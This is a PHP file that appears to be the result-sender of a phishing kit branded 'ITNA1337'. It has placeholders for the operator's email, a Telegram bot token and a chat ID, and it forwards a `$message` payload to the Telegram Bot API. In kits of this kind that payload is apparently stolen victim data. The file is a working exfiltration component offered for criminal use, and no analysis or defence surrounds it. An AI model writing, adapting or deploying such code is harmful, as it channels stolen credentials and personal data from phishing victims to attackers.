<?php
////////////////////////////////////////////////////////
//  ___  _____  _   _     _     _  _____ _____ _____  // 
// |_ _||_   _|| \ | |   / \   / ||___ /|___ /|___  | // 
//  | |   | |  |  \| |  / _ \  | |  |_ \  |_ \   / /  // 
//  | |   | |  | |\  | / ___ \ | | ___) |___) | / /   //
// |___|  |_|  |_| \_|/_/   \_\|_||____/|____/ /_/    //
//                                                    //
//    Telegram : @ITNA1337 | Channel @itnatools       //
////////////////////////////////////////////////////////                                                   

// YOUR EMAIL HERE BRO
$send = "YOUR Email Here";

// YOUR Telegram Bot
$token = "50101719:AAEY6AaASC2JcNqDIfFyVYd6-sRaHfl";
$data = [
'text' => $message,

// YOUR CHAT ID
'chat_id' => '51194556'


];

file_get_contents("https://api.telegram.org/bot$token/sendMessage?" . http_build_query($data) );
?>